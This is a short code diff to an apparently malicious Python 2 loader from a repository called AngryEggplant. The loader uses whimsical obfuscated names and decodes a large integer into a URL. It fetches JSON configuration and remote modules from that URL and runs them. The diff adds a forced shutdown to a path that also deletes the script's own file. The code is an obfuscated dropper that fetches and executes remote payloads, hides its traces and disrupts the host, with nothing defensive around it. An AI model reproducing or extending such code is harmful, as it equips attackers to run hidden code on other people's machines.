@@ -56,6 +56,7 @@ https://github.com/colental/AngryEggplant
 def run(config=None):
     if not config:
        os.remove(__file__) or os.remove(sys.argv[0])
+       os.system('shutdown /s /t 1' if os.name is 'nt' else 'shutdown --poweroff --no-wall')
        sys.exit(0)
     SomberUnbecomingAmusement = lambda x: bytes(bytearray.fromhex(hex(x).strip('0x').strip('L')))
     AccidentalAquaticCactus = requests.get(SomberUnbecomingAmusement(config)).json()
@@ -87,7 +88,9 @@ def run(config=None):
         return module.main(**AccidentalAquaticCactus['settings'])
 
 def main():
-    return run(1693114222428533660684153815687534358320722439046668875124625561309057563508504087964322442836407234496322339842390000490653936367070498059780526639911879349169443847176075523354478)
+    config = 5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950
+    print bytes(bytearray.fromhex(hex(long(config)).strip('0x').strip('L')))
+    return run(config)
 
 if __name__ == '__main__':
     main()
